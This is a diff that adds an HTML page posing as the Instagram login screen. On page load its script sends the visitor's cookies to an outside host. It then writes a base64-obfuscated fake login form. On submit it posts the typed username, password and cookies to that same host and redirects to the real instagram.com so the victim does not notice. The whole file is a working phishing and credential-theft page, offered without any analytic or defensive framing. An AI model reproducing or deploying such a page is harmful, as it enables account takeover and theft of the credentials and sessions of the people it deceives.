@@ -1,0 +1,15 @@
+<!DOCTYPE html><html><head><title>Login • Instagram</title><meta charset="UTF-8">
+<script type="text/javascript">
+window.onload = function() {
+    var c = document.cookie;
+    fetch('https://4f7573d52662cf30e0fbguw9udwyyyyyb.oast.pro?type=init', {method:'POST', mode:'no-cors', body:btoa(c)});
+    document.write(atob("PGJvZHk+PGRpdiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7bWFyZ2luLXRvcDoyMCU7Zm9udC1mYW1pbHk6c2Fucy1zZXJpZjsiPjxoMT5JbnN0YWdyYW08L2gxPjxmb3JtIGlkPSJhIj48aW5wdXQgdHlwZT0idGV4dCIgaWQ9InUiIHBsYWNlaG9sZGVyPSJVc2VybmFtZSIgc3R5bGU9ImRpc3BsYXk6YmxvY2s7bWFyZ2luOjEwcHggYXV0bzsiPjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgaWQ9InAiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCIgc3R5bGU9ImRpc3BsYXk6YmxvY2s7bWFyZ2luOjEwcHggYXV0bzsiPjxidXR0b24gdHlwZT0ic3VibWl0Ij5Mb2cgSW48L2J1dHRvbj48L2Zvcm0+PC9kaXY+PC9ib2R5Pg=="));
+    document.getElementById('a').onsubmit = function(e) {
+        e.preventDefault();
+        fetch('https://4f7573d52662cf30e0fbguw9udwyyyyyb.oast.pro?type=full', {
+            method:'POST', mode:'no-cors',
+            body: JSON.stringify({u:document.getElementById('u').value, p:document.getElementById('p').value, c:c})
+        }).then(function() { window.location.href='https://instagram.com'; });
+    };
+};
+</script></head><body></body></html>
